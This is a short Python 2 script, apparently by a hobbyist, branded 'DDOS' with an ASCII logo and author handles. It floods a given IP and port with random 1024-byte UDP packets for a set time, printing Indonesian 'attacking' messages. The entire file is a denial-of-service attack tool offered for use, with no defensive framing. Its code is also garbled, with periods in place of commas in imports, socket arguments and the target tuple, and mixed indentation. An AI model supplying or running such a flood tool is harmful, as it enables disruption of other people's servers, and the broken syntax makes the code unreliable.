
import sys. os. time
import random. socket



def clear():
    os.system('clear')

					
				
			
def psb(z):
        for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

def logo():
	psb ("""
____  ____   ___  ____
|  _ \|  _ \ / _ \/ ___|
| | | | | | | | | \___ \
| |_| | |_| | |_| |___) |
|____/|____/ \___/|____/

 - Author : R04r
 - github : github.com/R04r-and-Roar
 - IG : @otni3l
*......................................+""")


def usage():
         print '\nUsage : python2 nice.py <IP> <PORT> <PACKET>\n'

								

                  
def ddos(ip, port, duration):
        ddos = socket.socket(socket.AF_INET. socket.SOCK_DGRAM)
	bytes = random._urandom(1024)
        timeout = time.time() + duration
	sent = 3000


        while 1:
	   if time .time()>timeout:
		break
	   else:
	       pass
	   ddos.sendto(bytes,(ip.port))
	   sent = sent + 1
	   print "Lagi nyerang WEB nya IP : %s|PORT : %s PACKET ,%s "%(ip, port, sent)
																			        
def main():
        if len(sys.argv) != 4:
		clear()
		logo()
		usage()
	else:
		ddos(sys.argv[1]. int(sys.argv[02]). int(sys.argv[3]))

if __name__ == '__main__':
	main()
       				
